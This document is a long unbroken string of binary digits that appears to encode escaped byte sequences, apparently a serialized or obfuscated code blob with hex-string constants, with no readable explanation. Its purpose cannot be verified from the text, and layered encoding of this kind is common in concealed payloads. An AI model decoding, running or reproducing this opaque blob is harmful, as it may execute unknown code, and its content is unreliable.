110001111000001100010011011101100100010111000111100000110000001101000101110001111000001100000011001101011100011110000011000100110111011001000101110001111000001110000011100001011100011110000011000000110000010111000111100000110001001101110110010001100100010111000111100000110000001100110101110001111000001100010011011101100100010111000111100001100001011001100101110001111000001100000011001001011100011110000011000100110111011001000101110001111000001110000011010001011100011110000011000000110000010111000111100000110001001101110110010001011100011110000110001000110110010111000111100000110000001100100101110001111000001100010011011101100100010111000111100001100010001101110101110001111000001100000011001001011100011110000011000100110111011001000101110001111000011000100011100001011100011110000011000000110010010111000111100000110001001101110110010001100101010111000111100000110000001100110101110001111000001100010011011101100100010111000111100000111000001101000101110001111000001100000011000001011100011110000011000100110111011001000110111101011100011110000011000000110010010111000111100000110001001101110110010001100110010111000111100000110000001100110101110001111000001100010011011101100100011001110101110001111000001100000011001101011100011110000011000100110111011001000110100001011100011110000011000000110011010111000111100000110001001101110110010001101001010111000111100000110000001100110101110001111000001100010011011101100100010111000111100000111000001101000101110001111000001100000011000001011100011110000011000100110111011001000101110001101110010111000111100000110000001100110101110001111000001100010011011101100100001100100101110001111000001100000011001101011100011110000011000100110111011001000110101001011100011110000011000000110011010111000111100000110001001101110110010001011100011110000110011000110101010111000111100000110000001100100101110001111000001100010011011101100100010111000111100001100110001101100101110001111000001100000011001001011100011110000011000100110111011001000101110001111000011001000011100101011100011110000011000000110000010111000111100000110001001101110110010001011100011110000110011000110111010111000111100000110000001100100101110001111000001100010011011101100100010111000111100001100110001110000101110001111000001100000011001001011100011110000011000100110111011001000101110001111000001110000011100001011100011110000011000000110000010111000111100000110001001101110110010000100101010111000111100000110000001100100101110001111000001100010011011101100100001001100101110001111000001100000011001001011100011110000011000100110111011001000101110000100111010111000111100000110000001100100101110001111000001100010011011101100100010110010101110001111000001100000011001001011100011110000011000100110111011001000101101001011100011110000011000000110010010111000111100000110001001101110110010001011011010111000111100000110000001100100101110001111000001100010011011101100100010111000101110001011100011110000011000000110010010111000111100000110001001101110110010001011101010111000111100000110000001100100101110001111000001100010011011101100100010111100101110001111000001100000011001001011100011110000011000100110111011001000101111101011100011110000011000000110010010111000111100000110001001101110110010001100000010111000111100000110000001100100101110001111000001100010011011101100100011000010101110001111000001100000011001001011100011110000011000100110111011001000110100101011100011110000011000000110001010111000111100000110001001101110110010001100010010111000111100000110000001100100101110001111000001100010011011101100100011000110101110001111000001100000011001001011100011110000011000100110111011001000101110001111000001110000011100001011100011110000011000000110000010111000111100000110001001101110110010001100100010111000111100000110000001100100101110001111000001100010011011101100100001100100101110001111000001100000011000101011100011110000011000100110111011001000110010101011100011110000011000000110010010111000111100000110001001101110110010001011100011110000011100000111000010111000111100000110000001100000101110001111000001100010011011101100100010111000111100001100110001100000101110001111000001100000011000101011100011110000011000100110111011001000100110001011100011110000011000000110010010111000111100000110001001101110110010001001101010111000111100000110000001100100101110001111000001100010011011101100100011010110101110001111000001100000011001101011100011110000011000100110111011001000110110001011100011110000011000000110011010111000111100000110001001101110110010001101101010111000111100000110000001100110101110001111000001100010011011101100100011011100101110001111000001100000011001101011100011110000011000100110111011001000110111101011100011110000011000000110011010111000111100000110001001101110110010001110000010111000111100000110000001100110101110001111000001100010011011101100100011100010101110001111000001100000011001101011100011110000011000100110111011001000111001001011100011110000011000000110011010111000111100000110001001101110110010001110011010111000111100000110000001100110101110001111000001100010011011101100100011101000101110001111000001100000011001101011100011110000011000100110111011001000111010101011100011110000011000000110011010111000111100000110001001101110110010001110110010111000111100000110000001100110101110001111000001100010011011101100100011101110101110001111000001100000011001101011100011110000011000100110111011001000111100001011100011110000011000000110011010111000111100000110001001101110110010001111001010111000111100000110000001100110101110001111000001100010011011101100100011110010101110001111000001100000011001101011100011110000011000100110111011001000111100101011100011110000011000000110011010111000111100000110001001101110110010001111001010111000111100000110000001100110101110001111000001100010011011101100100011110010101110001111000001100000011001101011100011110000011000100110111011001000111100101011100011110000011000000110011010111000111100000110001001101110110010001111010010111000111100000110000001100110101110001111000001100010011011101100100011110010101110001111000001100000011001101011100011110000011000100110111011001000111100101011100011110000011000000110011010111000111100000110001001101110110010001111001010111000111100000110000001100110101110001111000001100010011011101100100011110110101110001111000001100000011001101011100011110000011000100110111011001000111110001011100011110000011000000110011010111000111100000110001001101110110010001110100010111000111100000110000001100110101110001111000001100010011011101100100011101010101110001111000001100000011001101011100011110000011000100110111011001000111011001011100011110000011000000110011010111000111100000110001001101110110010001111101010111000111100000110000001100110101110001111000001100010011011101100100011111100101110001111000001100000011001101011100011110000011000100110111011001000101110001111000001101110110011001011100011110000011000000110011010111000111100000110001001101110110010001111100010111000111100000110000001100110101110001111000001100010011011101100100010111000111100000111000001100000101110001111000001100000011001101011100011110000011000000110100010101010110010001011100011110000011100000110000010111000111100000110000001100110101001100101000010111000111100000111000001100010101110001111000001100000011001101011100011110000011000000110000010111000111100000110000001100000111010001011100011110000011000000110100010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100000011000000110000001100000111010001011100011110000011000000110010010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000011001010111100001110011010111000111100000110000001100110101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000110010101100011001000100111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001000110011001100100011000100110111001101010011011100110011001101110011001001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010011001100011011000110010001101100011100100110110011001010011001001100110011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101110011000000110111001110010011011100110100001101100011100000110110011001100111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011001100101001100000110000100110010001100110011010000110110001101100011000101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110001100110011011000110101001101100011001000110110011001100011011001100110011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100110001000110010001100000011010000110011001101110011001000110110001100010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011000110011001101100110001000110110001101010011011100110010001100100011000001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110101001101100011011000110101001101110011001000110111001100110011011000111001011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100110011000110110011001010011001000110000001100110011001000110010001100000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011000110011001101100011000100110110011001010011001000110000001101100011001101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110111001100100011011000110001001101100011001100110110011000100011001000110000011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100011100100110110011001010011011100110100001101100110011000110010001100000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011010000110110001101100011000100110110001100110011011000110101001101100011001001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110011001100011011001100110001101100110001000110010001100000011010000110100011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100011000100110111001101000011011000110001001101100011001000110110001100010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011100110011001101100011010100110010001100000011001100110001001100110011000001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110011001100000011001000110101001100100011000000110111001101110011011000111001011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101110011010000110110001110000011011001100110001101110011010100110111001101000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001000110000001101000011100100110110011001010011011100110100001101100011010101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110111001100100011011100110010001101110011010100110111001100000011011100110100011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100011100100110110011001100011011001100101001100100011000000110100001100100111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011100111001001100100011000000110100001101100011011000110001001101100011001101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110001101010011011000110010001101100110011000110110011001100011011001100010011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100100011000000110100001101100011011000111001001101110011001000110110001101010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011100110111001101100011000100110110011000110011011001100011001100100011000001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010001100010011000001100001001100100011001100110101001101000011011000111000011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100011100100110111001100110011001000110000001101110011000000110111001100100111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011001100110001101100011011100110111001100100011011000110001001101100110010001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010001100000011011000111001001101110011001100110010001100000011011000110110011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100110011000110111001100100011001000110000001101100011010100110110001101000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011100110101001101100011001100110110001100010011011100110100001101100011100101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110011001100011011001100101001101100011000100110110011000110011001000110000011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101110011000000110111001101010011011100110010001101110011000000110110011001100111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011100110011001101100011010100110111001100110011001000110000001101100110011001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110011001010011011001100011001101110011100100110010011001010011000001100001011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100100011001100110100001101000011011001100110001101100110010100110010001101110111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011100110100001100100011000000110110001100010011011100110100001101110011010001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110001100010011011000110011001101100110001000110010001100000011011100110000011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100011010100110110011001100011011100110000001101100110001100110110001101010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001000110000001101100011011000110110001100010011011000110011001101100011010101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110001100100011011001100110001101100110011000110110011000100011001000110000011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100011000100110110001100110011011000110011001101100110011000110111001101010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011001100101001101110011010000110111001100110011001000110000001101100011100101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110111001101000011001000110111001101110011001100110010001100000011011000111001011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100110001100110110011000110011011000110101001101100011011100110110001100010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011001100011001100100011000000110010001100010011001000110000001100000110000101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010001100110011010000111001001101100011011000110010001100000011011100111001011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100110011000110111001101010011001000110000001101110011011100110110001100010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011001100101001101110011010000110010001100000011011100110100001101100110011001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010001100000011011000110011001101110011001000110110001100010011011000110011011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100110001000110010001100000011011000111001001101100110010100110111001101000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011001100110001100100011000000110111001100110011011001100110001101100110010001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110001101010011011001100110001101100110010100110110001101010011001000110111011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101110011001100110010001100000011011000110001001101100011001100110110001100110111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011001100110001101110011010100110110011001010011011100110100001100100110001101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010001100000011011100111001001101100110011000110111001101010011001000110000011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100110010000110111001101010011011100110011001101110011010000110010001100000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011000111000001101100011000100110111001101100011011000110101001100100011000001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110111001101000011011000111000001101100011010100110010001100000011011100110000011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100011010100110111001100100011011001100100001101100011100100110111001100110111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011100110011001101100011100100110110011001100011011001100101001100100011000001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110011001100011011000110110001100100011000000110111001101000011011000111000011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100011010100110010001100000011011100110101001101110011001100110110001101010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011100110010001100100110010100110010001100000011000001100001001100100011001101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110100001110010011011001100101001101100011011000110110011001100011011100110011011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100011010100110110001100110011010000111000001101100011000100110110001100110111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011001100010001101100011010100110111001100100011001000110000001101100011100101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110111001100110011001000110000001101100110010100110110011001100011011100110100011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100100011000000110111001100100011011000110101001101110011001100110111001100000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011001100110001101100110010100110111001100110011011000111001001101100011001001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110011000110011011000110101001100100110010100110000011000010011000001100001011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100000110000100110110001110010011011001100100001101110011000000110110011001100111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011100110010001101110011010000110010001100000011011100110011001101110011100101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110111001100110011000001100001001101100011100100110110011001000011011100110000011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100110011000110111001100100011011100110100001100100011000000110111001100100111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011000110001001101100110010100110110001101000011011001100110001101100110010001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110111001100100011011100110100001100100011000000110110011001000011011000110101011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100011001100110110001110000011011000110001001101100110010100110110001110010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011101100001001101100011010100110000011000010011011000111001001101100110010001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110111001100000011011001100110001101110011001000110111001101000011001000110000011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100011001100110110011001100011011001100110001101100110001000110110001110010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011000110101001101100110001100110110001110010011011000110010001100000110000101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110000011000010011001000110011001100100011000000110100001100110011011001100110011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100110010100110111001100110011011001100110001101100110001100110110001101010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001000110000001101100011001100110110011001100011011001100011001101100110011001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110111001100100011011100110011001100000110000100110110001100100011011000110111011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100100011000000110011011001000011001000110111001100100011011100110010001100000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001000110011001100100011000000110010001101110011010101100011001100110011000001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110011001100110011001100110011001101010110001000110011001101000011001100110100011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100110010000110010001101110011001000110000001100100011000000110010001100110111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001000110000001101100011011100110111001100100011011000110001001101110011100101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110000011000010011010100110111001100100011000000110011011001000011001000110000011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100011001000110110001101110011001001100010001100100011011100110101011000110111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001100110000001100110011001100110011001100110011010101100010001100110011000001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010001100000011011100110111001101100011100000110110001110010011011100110100011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100011010100110010001100000011001000111000001101100110010100110110011001100111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011100110010001101100110010000110110001100010011011001100011001100100011100101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110000011000010011010100110010001100100011000000110011011001000011001000110000011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100110011000000110011001100110011001100110011001101010110001000110011001100110111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001100110001001101100110010000110010001101110011001000110000001100100011000001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010001100110011001000110000001101110011001000110110001101010011011000110100011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100000110000100110100001101110011001000110000001100110110010000110010001100000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001100110010001101100110010000110010001101110011001000110000001100100011000001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010001100110011001000110000001101100011011100110111001100100011011000110101011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100011010100110110011001010011000001100001001101000110011000110010001100000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001101100100001100100011000000110110001100100011011000110111001100100110001001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010001101110011010101100011001100110011000000110011001100110011001100110011011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101010110001000110011001100110011001100110011001101100110010000110010001101110111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001000110000001100100011000000110010001100110011001000110000001101100110011001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110111001100100011011000110001001101100110010100110110001101110011011000110101011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100000110000100110100001100100011001000110000001100110110010000110010001100000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001100110100001101100110010000110010001101110011001000110000001100100011000001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010001100110011001000110000001101100011001000110110011000110011011100110101011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100011010100110000011000010011010100110000001100100011000000110011011001000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001000110000001101100011001000110110001101110011001001100010001100100011011101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110101011000110011001100110000001100110011001100110011001100110011010101100010011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100110011001100110011001101010011011001100100001100100011011100110010001100000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001000110000001100100011001100110010001100000011011100110000001101110011010101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110111001100100011011100110000001101100110001100110110001101010011000001100001011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101000011001100110010001100000011001101100100001100100011000000110110001100100111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011000110111001100100110001000110010001101110011010101100011001100110011000001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110011001100110011001100110011001101010110001000110011001100110011001100110110011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100100011000000110110001100110011011100111001001101100011000100110110011001010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011000001100001001101000011011100110101001100100011001000110000001100110110010001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110011001100110011001100110111001101100110010000110010001101110011001000110000011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100100011000000110010001100110011001000110000001101100011011100110111001100100111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011000110001001101110011100100110000011000010011000001100001001101000011011101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110100001110000011010100110100001100100011000000110011011001000011001000110000011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101000011011100110010011000100011001000110111001100100011011100110010001101110111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011000001100001001100100011000000110010001100000011001000110000001100100011000001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010001100000011001000110000001100100011000000110010001100000011001001100010011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100110110010000110011011001000011001101100100001100110110010000110011011001000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001101100100001100100110001000110000011000010011001000110000001100100011000001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010001100000011001000110000001100100011000000110010001100000011001000110000011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100100011000000110111011000110011001001100101001100100110010100110010011001010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001001100101001100100110010100110010011001010011001001100101001100100110010101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010011001010011001001100101001100100011011100110010001101110011001000110111011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100100110001000110100011001100011001001100010001100100011011100110010001101110111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001000110111001101000011011000110110001100010011011000110011001101100011010101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110100001100110011011100110010001101100011000100110110001100110011011001100010011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100011010100110111001100100011001000110000001101110011011000110010001100000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001100110010001100100011011100110010001101110011001000110111001100100110001001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010011001010011011101100011001100000110000100110010001100000011001000110000011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100100011000000110010011000100011001001100100001100100110010000110010011001000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001001100100001100100110010000110010011001000011001001100100001100100110010001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010011001000011001001100100001100100110010000110010011000100011000001100001011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100100011000000110010001100000011001000110000001101110110001100110010001101110111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001000110111001100100011011100110010011000100011010000110011001100100110001001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010001101110011001000110111001100100011011100110010001100110011010000110001011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101110011010100110111001101000011011000111000001101100110011000110111001100100111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001101100001001100100011000000110100001110010011011001100101001101100011011001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110011001100011010100110011001101100011010100110110001100110011010000111000011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100011000100110110001100110011011001100010001101100011010100110111001100100111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001000110111001100100011011100110010001101110011001001100010001101000011011101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010011000100011001000110111001100100011011100110010001101110011001000110000011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100100011000000110010001100000011001000110000001101110110001100110000011000010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001000110111001100100011011100110010001101110011001000110011001101000011001101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110011001100011011001100101001101110011010000110110001100010011011000110011011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101110011010000110011011000010011001000110000001101110011011100110111001101110111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011100110111001100100110010100110111001101000011011100110111001101100011100101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110111001101000011011100110100001101100011010100110111001100100011001001100101011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100011001100110110011001100011011001100100001100100110011000110110001100010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011000110010001101100011100000110110001110010011011100110011001101100011100001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110001101010011011001100010001101100110010000110110001100010011011001100101011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100011100100110011001100000011001100110000001100110011001000110010001101110111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001000110111001100100011011100110010011000100011010000110111001100100110001001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010001101110011001000110111001100100011011100110111011000110011000001100001011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100100011011100110010001101110011001000110111001100100011001100110100001101000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011000110001001101110011010000110110001101010011001101100001001100100011000001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110011001100100011001100110011001100100110011000110011001100010011001100110000011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100100110011000110011001100100011001100110000001100110011000100110011001101010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001000110111001100100011011100110010001101110011001000110011001101010011010001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110001110000011011000111001001101110011001100110010001100000011011100110100011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100110011000110110011001100011011001100011001100100011000000110110001110010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011100110011001100100011000000110110011001000011011000110001001101100011010001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110001101010011001000110000001101100011011000110110011001100011011100110010011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100100011000000110111001100000011011000110101001101100110010100110111001101000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011000110101001101110011001100110111001101000011011000111001001101100110010101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110001101110011001001100101001100100011000000110010001101110011001000110111011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100100011011100110010011000100011010000110111001100100110001000110010001101110111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001000110111001100100011011100110010001100000011001000110000001100100011000001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110001110000011011000110001001101100110010100110110001101110011011000111001011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100110010100110110001101110011001000110000001101110011010000110110001110000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011000110101001100100011000000110100001101000011011000110101001101110011001101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110001100110011011100110010001101100011100100110111001100000011011100110100011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100011100100110110011001100011011001100101001100100011000000110110011001100111